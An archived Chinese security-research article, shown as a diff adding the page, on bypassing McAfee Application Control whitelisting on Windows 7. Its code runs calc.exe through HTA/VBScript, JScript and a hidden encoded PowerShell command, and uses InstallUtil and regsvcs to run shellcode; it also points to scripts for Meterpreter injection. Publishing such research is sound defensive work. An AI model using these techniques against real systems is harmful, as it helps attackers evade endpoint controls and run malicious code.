@@ -1,0 +1,77 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">Bypass McAfee Application Control——Code Execution</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">三好学生</a> <span class="bull">·</span> <time title="2015/12/07 12:09" ui-time="" datetime="2015/12/07 12:09" class="published ng-binding ng-isolate-scope">2015/12/07 12:09</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 前言</h1><hr><p>应用白名单（Application Whitelisting）是用来防止未认证程序运行的一个计算机管理实践。它的目的是保护计算机和网络不受应用伤害。 McAfee Application Control作为其中比较有代表性的产品，使用动态的信任模型，避免了单调的人工更新许可清单工作。由于企业会面临来自网络的大量未知软件，因此这款可以集中管理的解决方案有助于及时控制系统安全策略，满足企业的运营需求。</p><p>那么，我们就试试看，究竟能不能绕过最新版的McAfee Application Control 6.2.0（截至投稿日期）</p><p><img alt="p1" img-src="745c5f94056891a3a255b53790ae5ffd7887fd12.jpg"></p><h1>0x01 简介</h1><hr><p><img alt="p2" img-src="27392d5eb37cbd85ca869a69e091a52e7a322ab7.jpg"></p><p>McAfee Application Control对常见文件类型如exe、dll、bat作了限制，白名单外的这些文件均无法运行。所以这次的目标就是绕过限制来执行文件。</p><h1>0x02 配置McAfee Application Control</h1><hr><p>操作系统：<code>win7x86</code></p><h3>1.下载McAfee Application Control</h3><p>到<a href="http://www.mcafee.com/us/products/application-control.aspx">http://www.mcafee.com/us/products/application-control.aspx</a>填写信息并安装</p><h3>2.配置流程图</h3><p><img alt="p3" img-src="c8d16a76e315d39fd5cc895e074b257ab551051c.jpg"></p><h3>3.Add the license</h3><p>管理员权限执行McAfee Solidifier 命令行</p><p><strong>1.查看许可证是否安装</strong></p><p>执行</p><pre><code>sadmin license list
+</code></pre><p><strong>2.添加许可证</strong></p><p>在McAfee&#95;Application&#95;Control&#95;v6&#95;2&#95;0&#95;License.txt中会有</p><p>执行</p><pre><code>sadmin license add 2708-0108-1402-2208-0710
+</code></pre><p>如图</p><p><img alt="p4" img-src="d4d5d6de9b5cf546905be0e2798a76d479f092f9.jpg"></p><p><strong>3.重启服务Application Control service</strong></p><p>执行</p><pre><code>net stop scsrvc
+net start scsrvc
+</code></pre><h3>4.Create the whitelist</h3><p><strong>1.创建白名单规则</strong></p><p>执行</p><pre><code>sadmin solidify
+</code></pre><p>需要等待很长一段时间，为当前系统中的所有文件创建规则，如果未添加许可证，该功能无法使用</p><p><strong>2.查看白名单状态</strong></p><p>执行</p><pre><code>sadmin status
+</code></pre><p>确保状态为Solidified</p><p>如图</p><p><img alt="p5" img-src="0eb860fabf8bcdd65f93912392d8d729b777622d.jpg"></p><h3>5.Place Application Control in Enabled mode</h3><p><strong>1.开启程序控制，禁止白名单以外的程序运行</strong></p><p>执行</p><pre><code>sadmin enable
+</code></pre><p>如图</p><p><img alt="p6" img-src="8a3791e3b274eb462cecaae0d97f8f153754d96f.jpg"></p><p>重启系统,重启服务，执行</p><pre><code>net stop scsrvc
+net start scsrvc
+</code></pre><p><strong>2.查看状态</strong></p><p>执行</p><pre><code>sadmin status
+</code></pre><p>确保McAfee Solidifier状态为Enabled</p><p>重启后如图</p><p><img alt="p7" img-src="c3a2e701752b74102f00e9685c0a13af5c9b87d9.jpg"></p><p><strong>3.测试</strong></p><p>新建一些测试文件</p><p>执行</p><pre><code>sadmin list-unsolidified
+</code></pre><p>查看白名单以外的程序</p><p>如图</p><p><img alt="p8" img-src="0172ba860cdde233839254daa78787485aae0fba.jpg"></p><p>执行</p><pre><code>sadmin scripts list
+</code></pre><p>查看禁止执行的文件类型</p><p>如图</p><p><img alt="p9" img-src="e005e20fdc2964a3ea39daab9ab6b5f2d6a3b483.jpg"></p><p>分别执行exe、bat、dll，均被限制，如图</p><p><img alt="p10" img-src="58a37d4ae53ed9d2d5419a0c274de22aa5c5f428.jpg"></p><p><img alt="p11" img-src="69bb523c0f3a8b5e177de7524f0a6497ed92cd03.jpg"></p><h1>0x03 代码执行漏洞</h1><hr><h3>1.难题</h3><p>无法执行自己的程序</p><h3>2.分析</h3><p>根据白名单系统的特点，绕过的思路如下：</p><ol><li><p>找到系统中的特定白名单程序</p><p>利用该程序执行代码</p><p>编写代码使其执行我们自己的程序</p></li><li><p>找到系统中未被拦截的特定程序</p><p>利用该程序执行代码</p><p>编写代码使其执行我们自己的程序</p></li></ol><h1>0x04 绕过方法</h1><hr><p>最终我们还是做到了：D</p><h3>1.执行vbs</h3><p>利用hta文件</p><blockquote><p>Tips：</p><p>hta是HTML Applications的缩写，是利用HTML和Dynamic HTML(DHTML)开发应用程序</p></blockquote><p>利用如下代码即可通过hta执行vbs</p><pre><code>#!html
+&lt;HTML&gt; 
+&lt;HEAD&gt; 
+&lt;script language="VBScript"&gt;
+    Set objShell = CreateObject("Wscript.Shell")
+    objShell.Run "calc.exe"
+&lt;/script&gt;
+&lt;/HEAD&gt; 
+&lt;BODY&gt; 
+&lt;/BODY&gt; 
+&lt;/HTML&gt; 
+</code></pre><p>如图</p><p><img alt="p12" img-src="f957c4b7785bb24eaa552b6deb2c858a872f86f9.jpg"></p><p>然而并不完美，hta的界面会默认显示，所以我们需要进一步修改来隐藏hta的主界面</p><p>加入属性指定hta执行后最小化显示，完整的代码如下</p><pre><code>#!html
+&lt;HTML&gt; 
+&lt;HEAD&gt; 
+&lt;script language="VBScript"&gt;
+    Set objShell = CreateObject("Wscript.Shell")
+    objShell.Run "calc.exe"
+&lt;/script&gt;
+&lt;HTA:APPLICATION ID="test"
+WINDOWSTATE = "minimize"&gt;
+
+&lt;/HEAD&gt; 
+&lt;BODY&gt; 
+&lt;/BODY&gt; 
+&lt;/HTML&gt; 
+</code></pre><p>保存为vbs.hta,执行如图</p><p><img alt="p13" img-src="3fe0cb187641e1cfda8216b50c2cec0a827135a0.jpg"></p><h3>2.执行jscript</h3><p>jscript未被McAfee Application Control限制，因此可以被利用</p><p>如下代码保存为calc.js</p><pre><code>#!js
+var objShell = new ActiveXObject("WScript.shell");
+objShell.run('calc.exe');
+</code></pre><p>执行成功，如图</p><p><img alt="p14" img-src="e9e41a93cb4c411344c657f507009aaa7528d046.jpg"></p><h3>3.执行powershell</h3><p>如果可以执行powershell代码，还担心绕不过McAfee Application Control吗？</p><p>当然，默认是肯定无法执行的，如图</p><p><img alt="p15" img-src="736e0a6422a6074c2438e2f36c38d8508fab22e4.jpg"></p><p><strong>方法1：</strong></p><p>将ps1文件内容保存为script.txt，然后进入Powershell环境执行如下代码：</p><pre><code>Get-Content script.txt | iex
+</code></pre><p>但是如果txt中含有函数，会产生如下错误，需要更改脚本内容，错误如图</p><p><img alt="p16" img-src="576f9d412a5026bc556392ae79a6c3b5ca0fa2fd.jpg"></p><p><strong>方法2：</strong></p><p>利用hta可以执行vbs，再用vbs执行Powershell</p><p>使用如下代码并保存为vbs+ps.hta</p><pre><code>#!html
+&lt;HTML&gt; 
+&lt;HEAD&gt; 
+&lt;script language="VBScript"&gt;
+    Set WshShell = CreateObject("WScript.Shell")
+    Connect="powershell -nop -windows hidden -E YwBhAGwAYwAuAGUAeABlAA=="
+    WshShell.Run Connect, 4, true
+
+&lt;/script&gt;
+&lt;HTA:APPLICATION ID="test"
+WINDOWSTATE = "minimize"&gt;
+
+&lt;/HEAD&gt; 
+&lt;BODY&gt; 
+&lt;/BODY&gt; 
+&lt;/HTML&gt; 
+</code></pre><p>执行后先调用vbs脚本，再执行Powershell命令</p><p><strong>方法3：</strong></p><p>利用快捷方式执行Powershell</p><p>右键新建一个快捷方式，填入如下代码，并保存为ps.lnk</p><pre><code>powershell -nop -windows hidden -E YwBhAGwAYwAuAGUAeABlAA==
+</code></pre><p>如图</p><p><img alt="p17" img-src="7a374ea4455628bcd9065f735e3b533e331da69e.jpg"></p><p>运行快捷方式后执行Powershell命令，弹出计算器</p><p><strong>方法4：</strong></p><p>利用Powershell环境直接执行，简单粗暴</p><p>cmd下执行Powershell.exe进入Powershell环境，然后在下面直接输入所有命令即可</p><h2>0x05 漏洞利用</h2><hr><p>目前我们已经可以在安装McAfee Application Control的系统中执行vbs、jscript、Powershell，那么利用上述方法可以实现什么呢？</p><h3>1.执行shellcode</h3><p><strong>方法1：</strong></p><p>利用vbs,将shellcode转为vbs，然后通过hta执行</p><p>参考地址：</p><p><a href="http://blog.didierstevens.com/2009/05/06/shellcode-2-vbscript/">http://blog.didierstevens.com/2009/05/06/shellcode-2-vbscript/</a></p><p><strong>方法2：</strong></p><p>利用js</p><p><strong>方法3：</strong></p><p>利用Powershell</p><p>在之前的文章对通过Powershell执行shellcode有过详细介绍，对其中的ps1文件细节作简单修改保存为1-CodeExecution-Shellcode.ps1</p><p>进入Powershell环境，然后在里面执行1-CodeExecution-Shellcode.ps1的所有内容</p><p>如图</p><p><img alt="p18" img-src="45095cc8119dc6b5e4c292d95272651be77e2a00.jpg"></p><p><strong>方法4：</strong></p><p>利用InstallUtil</p><p>在之前的文章《利用白名单绕过限制的更多测试》对此有过详细介绍</p><p>上传shellcode.cs,执行如下命令：</p><pre><code>C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /unsafe  /out:exeshell.exe Shellcode.cs
+
+C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /logfile= /LogToConsole=false /U exeshell.exe
+</code></pre><p>如图</p><p><img alt="p19" img-src="69c572626bd1e1b4a7fe064818cdcaffd70e944f.jpg"></p><p><strong>方法5：</strong></p><p>如果系统支持.net4.0,可以利用regsvcs</p><p>参考地址：</p><p><a href="https://gist.github.com/subTee/fb09ef511e592e6f7993">https://gist.github.com/subTee/fb09ef511e592e6f7993</a></p><p>上传key.snk和regsvcs.cs，执行如下命令：</p><pre><code>C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library 
+
+/out:regsvcs.dll /keyfile:key.snk regsvcs.cs
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe regsvcs.dll
+</code></pre><h3>2.执行exe</h3><p>利用Powershell</p><p>在之前的文章对通过Powershell执行exe有过详细介绍，对其中的ps1文件细节作简单修改保存为2-CodeExecution-Exe.ps1</p><p>进入Powershell环境，然后在里面执行2-CodeExecution-Exe.ps1的所有内容</p><p>如图</p><p><img alt="p20" img-src="fef779dac5d4d0e7acf0eb972a49b7312b917ebf.jpg"></p><h3>3、加载dll</h3><p>利用Powershell</p><p>在之前的文章对通过Powershell执行exe有过详细介绍，对其中的ps1文件细节作简单修改保存为3-CodeExecution-dll.ps1</p><p>进入Powershell环境，然后在里面执行3-CodeExecution-dll.ps1的所有内容</p><p>如图</p><p><img alt="p21" img-src="e523cc91badb73abac1a1a48f45e11940d11d5c5.jpg"></p><h3>4、注入meterpreter</h3><p>利用Powershell</p><p>在之前的文章对通过Powershell执行exe有过详细介绍，对其中的ps1文件细节作简单修改保存为4-Process Injection-Meterpreter.ps1</p><p>进入Powershell环境，然后在里面执行4-Process Injection-Meterpreter.ps1的所有内容</p><p>如图</p><p><img alt="p22" img-src="7f23d021fd7526e646a9da80eda55f4044c2c3a3.jpg"></p><h2>0x06 小结</h2><hr><p>我们成功在安装McAfee Application Control的系统上执行了vbs、exe、dll以及注入meterpreter。</p><p>当然McAfee Application Control还有其他一些保护功能，我们的研究测试也不只如此。</p><p><strong>注：</strong></p><p>以下文件可供下载</p><pre><code>1-CodeExecution-Shellcode.ps1
+2-CodeExecution-Exe.ps1
+3-CodeExecution-dll.ps1
+4-Process Injection-Meterpreter.ps1
+calc.js
+key.snk
+ps.lnk
+regsvcs.cs
+Shellcode.cs
+vbs+ps.hta
+vbs.hta
+</code></pre><p><strong>下载地址：</strong></p><p><a href="https://github.com/3gstudent/Bypass-McAfee-Application-Control--Code-Execution">https://github.com/3gstudent/Bypass-McAfee-Application-Control--Code-Execution</a></p><p>参考链接：</p><ol><li><a href="http://bsidesvienna.at/slides/2015/a_case_study_on_the_security_of_application_whitelisting.pdf">http://bsidesvienna.at/slides/2015/a&#95;case&#95;study&#95;on&#95;the&#95;security&#95;of&#95;application&#95;whitelisting.pdf</a></li><li><a href="https://kc.mcafee.com/resources/sites/MCAFEE/content/live/PRODUCT_DOCUMENTATION/24000/PD24662/en_US/AppCtrl_BestPractices_Guide.pdf">https://kc.mcafee.com/resources/sites/MCAFEE/content/live/PRODUCT&#95;DOCUMENTATION/24000/PD24662/en&#95;US/AppCtrl&#95;BestPractices&#95;Guide.pdf</a></li><li><a href="http://www.intel.com/content/dam/www/public/us/en/documents/guides/mcafee-application-control-product-guide.pdf">http://www.intel.com/content/dam/www/public/us/en/documents/guides/mcafee-application-control-product-guide.pdf</a></li><li><a href="http://subt0x10.blogspot.hk/2015/11/all-natural-organic-free-range.html">http://subt0x10.blogspot.hk/2015/11/all-natural-organic-free-range.html</a></li><li><a href="http://blog.didierstevens.com/2009/05/06/shellcode-2-vbscript/">http://blog.didierstevens.com/2009/05/06/shellcode-2-vbscript/</a></li><li><a href="http://subt0x10.blogspot.hk/2015/08/application-whitelisting-bypasses-101.html">http://subt0x10.blogspot.hk/2015/08/application-whitelisting-bypasses-101.html</a></li><li><a href="https://gist.github.com/subTee/a06d4ae23e2517566c52">https://gist.github.com/subTee/a06d4ae23e2517566c52</a></li><li><a href="https://gist.github.com/subTee/fb09ef511e592e6f7993">https://gist.github.com/subTee/fb09ef511e592e6f7993</a></li><li><a href="https://social.technet.microsoft.com/Forums/scriptcenter/en-US/08cce717-38d0-4def-a5bf-e5b4a846a597/run-powershell-from-hta">https://social.technet.microsoft.com/Forums/scriptcenter/en-US/08cce717-38d0-4def-a5bf-e5b4a846a597/run-powershell-from-hta</a></li></ol><hr><p>本文由三好学生原创并首发于乌云drops，转载请注明</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/11305" rel="bookmark" id="re1">Bypass McAfee Application Control--Write&amp;Read Protection</a></li><li><a href="http://drops.wooyun.org/tips/10556" rel="bookmark" id="re2">Powershell tricks::Code Execution &amp; Process Injection</a></li><li><a href="http://drops.wooyun.org/tips/3353" rel="bookmark" id="re3">Powershell tricks::Bypass AV</a></li><li><a href="http://drops.wooyun.org/tips/11804" rel="bookmark" id="re4">Bypass Windows AppLocker</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">lcx</span> <span class="reply-time">2015-12-08 16:30:25</span></div><p></p><p>方法1：</p><p>利用vbs,将shellcode转为vbs，然后通过hta执行</p><p>参考地址：</p><p>http://blog.didierstevens.com/2009/05/06/shellcode-2-vbscript/</p><p>这个东东转vbs，执行shellcode是不可以的。它转换后的代码不是vbs的代码，而是VB的代码，要通过VB编译成exe才可以的。<br>VBS执行程序（像DLL\SHELLCODE），可以参考一下我的这个技巧。http://www.haiyangtop.net/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/vbs%E8%B0%83%E7%94%A8dll%E7%9A%84tips.txt</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">_Evil</span> <span class="reply-time">2015-12-08 11:47:37</span></div><p></p><p>6666666666</p><p></p></div></div></div></div></div></main>
